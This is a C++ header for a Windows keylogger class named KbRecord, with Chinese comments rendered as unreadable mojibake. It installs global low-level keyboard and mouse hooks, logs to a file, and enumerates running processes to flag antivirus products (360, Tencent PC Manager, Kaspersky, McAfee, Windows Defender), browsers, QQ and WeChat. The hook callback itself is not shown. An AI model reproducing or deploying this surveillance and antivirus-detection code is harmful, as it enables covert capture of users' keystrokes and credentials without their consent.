//--------------------------------------------------------------------------------------
//
// File: KbRecord.h
//
// Licensed under the Apache License, Version 2.0 (the "License"); you may not use this 
// file except in compliance with the License. You may obtain a copy of the License at 
// http://www.apache.org/licenses/LICENSE-2.0  
//  
// THIS CODE IS PROVIDED *AS IS* BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, 
// EITHER EXPRESS OR IMPLIED, INCLUDING WITHOUT LIMITATION ANY IMPLIED WARRANTIES OR 
// CONDITIONS OF TITLE, FITNESS FOR A PARTICULAR PURPOSE, MERCHANTABLITY OR NON-INFRINGEMENT. 
//  
// See the Apache Version 2.0 License for specific language governing permissions and 
// limitations under the License.
//--------------------------------------------------------------------------------------

#pragma once
#include<iostream>
#include<fstream>
#include<ctime>
#include<string>
#include<map>
#include<TlHelp32.h>

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam);
namespace KbRecord
{
	class KbRecord
	{
	public:
		friend LRESULT CALLBACK::HookCallback(int code, WPARAM wParam, LPARAM lParam);
		KbRecord
		(
			std::string _Filename,
			std::ofstream::open_mode _Mode
		);
		~KbRecord();
		void GetSystemTime();
		void FileManager();
		template<typename T>
		std::ostream & operator<<(T str);
		void ProcessWarning();
		void Record();
	private:
		std::ofstream fs;
		std::string Filename;
		std::ofstream::open_mode Mode;
		bool isopen = 0;//�ļ��򿪵ı�־,��Ϊ1���ر�Ϊ0
		HHOOK keyboardHook;
		HHOOK mouseHook;
	};

	/*
	������KbRecord::KbRecord(std::string _Filename = "Record.log",std::ofstream::open_mode _Mode = std::fstream::app)
	��KbRecord�Ĺ��캯��
	���ļ����ļ���Ĭ��Record.log
	�ļ���д��ģʽĬ��std::fstream::app
	��װ���̹��Ӳ�����KbRecord::ProcessWarning()����
	�÷���KbRecord("1.txt",std::fstream::app);
	*/
	KbRecord::KbRecord
	(
		std::string _Filename = "Record.log",
		std::ofstream::open_mode _Mode = std::fstream::app
	) :
		Filename(_Filename),
		Mode(_Mode)
	{
		FileManager();
		keyboardHook = SetWindowsHookExA(WH_KEYBOARD_LL, HookCallback, GetModuleHandleA(NULL), NULL);
		mouseHook = SetWindowsHookExA(WH_MOUSE_LL, HookCallback, GetModuleHandleA(NULL), NULL);
		if (!mouseHook)
		{
			KbRecord::operator<<("�������ҹ�ʧ��");
			fs.close();
			exit(-1);
		}
		if (!keyboardHook)
		{
			KbRecord::operator<<("���󣺼��̹ҹ�ʧ��");
			fs.close();
			exit(-1);
		}
		ProcessWarning();
	}

	/*
	������KbRecord::~KbRecord()
	��KbRecord����������
	�رմ򿪵��ļ�
	ж�ؼ��̹���
	�÷���KR.~KbRecord();
	*/
	KbRecord::~KbRecord()
	{
		if (isopen)
		{
			GetSystemTime();
			fs << "��¼����" << std::endl;
			fs.close();
			isopen = 0;
			UnhookWindowsHookEx(keyboardHook);
			UnhookWindowsHookEx(mouseHook);
		}
	}

	/*
	������void KbRecord::GetSystemTime()
	��ȡϵͳʱ�䲢д���ļ�
	����ļ�û���򿪣��ȴ��ļ�
	�÷���KR.GetSystemTime();
	*/
	void KbRecord::GetSystemTime()
	{
		if (!isopen)
			FileManager();
		tm t;
		time_t t_t = time(NULL);
		char tmp[64];
		localtime_s(&t, &t_t);
		strftime(tmp, sizeof(tmp), "%Y/%m/%d %X\t", &t);
		fs << tmp;
	}

	/*
	������void KbRecord::FileManager()
	���ļ�
	�÷���KR.FileManager();
	*/
	void KbRecord::FileManager()
	{
		fs.open(Filename, Mode);
		if (!fs.is_open())
			abort();//��ʧ�ܽ���
		isopen = 1;//�ļ�״̬��1
		GetSystemTime();
		fs << "��¼��ʼ" << std::endl;
	}

	/*
	������std::ostream & KbRecord::operator<<(T MSG)
	д��ʱ�����Ϣ
	����ļ�û���򿪣��ȴ��ļ�
	��Ϣ��MSG����
	�÷���KR<<"OK";
	*/
	template<typename T>
	std::ostream & KbRecord::operator<<(T MSG)
	{
		if (!isopen)
			FileManager();
		GetSystemTime();
		fs << MSG;
		return fs;
	}

	/*
	������void KbRecord::ProcessWarning()
	�жϽ�����Ϣ
	����ļ�û���򿪣��ʹ��ļ�
	����������Ϣ��д���ļ�
	�÷���KR.ProcessWarning();
	*/
	void KbRecord::ProcessWarning()
	{
		if (!isopen)
			FileManager();
		HANDLE hProcessSnap;
		PROCESSENTRY32 pe32;
		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hProcessSnap == (HANDLE)-1)
			KbRecord::operator<<("CreateToolhelp32Snapshot failed");
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hProcessSnap, &pe32))
		{
			std::map<std::wstring, bool>process;//�����б�
			std::wstring QQ = _T("QQ.exe");//QQ
			std::wstring WeChatWeb = _T("WeChatWeb.exe");//΢��
			std::wstring WeChat = _T("WeChat.exe");//΢��
			std::wstring _360tray = _T("360tray.exe");//360ʵʱ����
			std::wstring _360Safe = _T("360Safe.exe");//360������
			std::wstring _360sd = _T("360sd.exe");//360ɱ��
			std::wstring QQPCTray = _T("QQPCTray.exe");//��Ѷ���Թܼ�ʵʱ����
			std::wstring QQPCRTP = _T("QQPCRTP.exe");//��Ѷ���Թܼ����ҷ���
			std::wstring QQPCMgr = _T("QQPCMgr.exe");//��Ѷ���Թܼ�������
			std::wstring avp = _T("avp.exe");//����˹��
			std::wstring KMService = _T("KMService.exe");//��ɽ����ȫ�ֲ���
			std::wstring kxescore = _T("kxescore.exe");//��ɽ������ϸ����
			std::wstring kxetray = _T("kxetray.exe");//��ɽ���Բ���ʵʱ���
			std::wstring Mcshield = _T("Mcshield.exe");//���˷ƺ��Ľ���
			std::wstring shstat = _T("shstat.exe");//���˷ƺ�̨
			std::wstring MSASCuil = _T("MSASCuiL.exe");//Windows Defender
			std::wstring MicrosoftEdge = _T("MicrosoftEdge.exe");//Microsoft Edge
			std::wstring MicrosoftEdgeCP = _T("MicrosoftEdgeCP.exe");//Microsoft Edge
			std::wstring iexplore = _T("iexplore.exe");//Microsoft Internet Explorer
			std::wstring _360se = _T("360se.exe");//360�����
			std::wstring _360chrome = _T("360chrome.exe");//360���������
			std::wstring chrome = _T("chrome.exe");//Chrome
			std::wstring firefox = _T("firefox.exe");//���
			/*�������������⣬����ʹ�������Win10ϵͳ רҵ�� x86����98������
			��������wstring��KbRecord()+~KbRecord()��*23+operator==()*98
			����ÿһ��ѭ����һ��wstring�����������ԼΪ�����캯��+��������+operator==��*98
			*/
			do
			{
				if (pe32.szExeFile == _360sd && !process[_360sd])
				{
					process[_360sd]++;
					KbRecord::operator<<("���棺��⵽360ɱ��������") << std::endl;
				}
				else if (pe32.szExeFile == _360tray && !process[_360tray])
				{
					process[_360tray] = true;
					KbRecord::operator<<("���棺��⵽360ʵʱ����������") << std::endl;
				}
				else if (pe32.szExeFile == _360Safe && !process[_360Safe])
				{
					process[_360Safe] = true;
					KbRecord::operator<<("���棺��⵽360�����������") << std::endl;
				}
				else if (pe32.szExeFile == QQPCTray && !process[QQPCTray])
				{
					process[QQPCTray] = true;
					KbRecord::operator<<("���棺��⵽��Ѷ���Թܼ�ʵʱ����������") << std::endl;
				}
				else if (pe32.szExeFile == QQPCRTP && !process[QQPCRTP])
				{
					process[QQPCRTP] = true;
					KbRecord::operator<<("���棺��⵽��Ѷ���Թܼ����ҷ���������") << std::endl;
				}
				else if (pe32.szExeFile == QQPCMgr && !process[QQPCMgr])
				{
					process[QQPCMgr] = true;
					KbRecord::operator<<("���棺��⵽��Ѷ���Թܼ������������") << std::endl;
				}
				else if (pe32.szExeFile == avp && !process[avp])
				{
					process[avp] = true;
					KbRecord::operator<<("���棺��⵽����˹��������") << std::endl;
				}
				else if (pe32.szExeFile == KMService && !process[KMService])
				{
					process[KMService] = true;
					KbRecord::operator<<("���棺��⵽��ɽ����ȫ�ֲ��������") << std::endl;
				}
				else if (pe32.szExeFile == kxescore && !process[kxescore])
				{
					process[kxescore] = true;
					KbRecord::operator<<("���棺��⵽��ɽ���Ե�����") << std::endl;
				}
				else if (pe32.szExeFile == kxetray && !process[kxetray])
				{
					process[kxetray] = true;
					KbRecord::operator<<("���棺��⵽��ɽ���Բ���ʵʱ��ص�����") << std::endl;
				}
				else if (pe32.szExeFile == Mcshield && !process[Mcshield])
				{
					process[Mcshield] = true;
					KbRecord::operator<<("���棺��⵽���˷ƺ��Ľ��̵�����") << std::endl;
				}
				else if (pe32.szExeFile == shstat && !process[shstat])
				{
					process[shstat] = true;
					KbRecord::operator<<("���棺��⵽���˷ƺ�̨������") << std::endl;
				}
				else if (pe32.szExeFile == MSASCuil && !process[MSASCuil])
				{
					process[MSASCuil] = true;
					KbRecord::operator<<("���棺��⵽Windows Defender������") << std::endl;
				}
				else if (pe32.szExeFile == QQ && !process[QQ])
				{
					process[QQ] = true;
					KbRecord::operator<<("��Ϣ����⵽QQ������") << std::endl;
				}
				else if ((pe32.szExeFile == MicrosoftEdge || pe32.szExeFile == MicrosoftEdgeCP) && !process[MicrosoftEdge] && !process[MicrosoftEdgeCP])
				{
					process[MicrosoftEdge] = true;
					process[MicrosoftEdgeCP] = true;
					KbRecord::operator<<("��Ϣ����⵽Microsoft Edge������") << std::endl;
				}
				else if ((pe32.szExeFile == WeChatWeb || pe32.szExeFile == WeChat) && !process[WeChat] && !process[WeChatWeb])
				{
					process[WeChat] = true;
					process[WeChat] = true;
					KbRecord::operator<<("��Ϣ����⵽΢�ŵ�����") << std::endl;
				}
				else if (pe32.szExeFile == iexplore && !process[iexplore])
				{
					process[iexplore] = true;
					KbRecord::operator<<("��Ϣ����⵽Internet Explorer������") << std::endl;
				}
				else if (pe32.szExeFile == _360se && !process[_360se])
				{
					process[_360se] = true;
					KbRecord::operator<<("��Ϣ����⵽360�����������") << std::endl;
				}
				else if (pe32.szExeFile == _360chrome && !process[_360chrome])
				{
					process[_360chrome] = true;
					KbRecord::operator<<("��Ϣ����⵽360���������������") << std::endl;
				}
				else if (pe32.szExeFile == chrome && !process[chrome])
				{
					process[chrome] = true;
					KbRecord::operator<<("��Ϣ����⵽Chrome�����������") << std::endl;
				}
				else if (pe32.szExeFile == firefox && !process[firefox])
				{
					process[firefox] = true;
					KbRecord::operator<<("��Ϣ����⵽��������������") << std::endl;
				}
			} while (Process32Next(hProcessSnap, &pe32));
			KbRecord::operator<<("������Ϣ������") << std::endl;
		}
		else
			KbRecord::operator<<("�����������") << std::endl;
		CloseHandle(hProcessSnap);
	}

	/*
	������void KbRecord::Record()
	��¼������Ϣ
	�÷���KR.Record();
	*/
	void KbRecord::Record()
	{
		MSG msg;
		while (true)
		{
			if (PeekMessageA(&msg, 0, 0, 0, PM_REMOVE))		//��Ϣѭ��
			{
				TranslateMessage(&msg);						//������Ϣ
				DispatchMessageW(&msg);
			}
			else
				Sleep(1);//����CPUռ�ù���
		}
		UnhookWindowsHookEx(keyboardHook);
		UnhookWindowsHookEx(mouseHook);			//ж�ع���
	}
}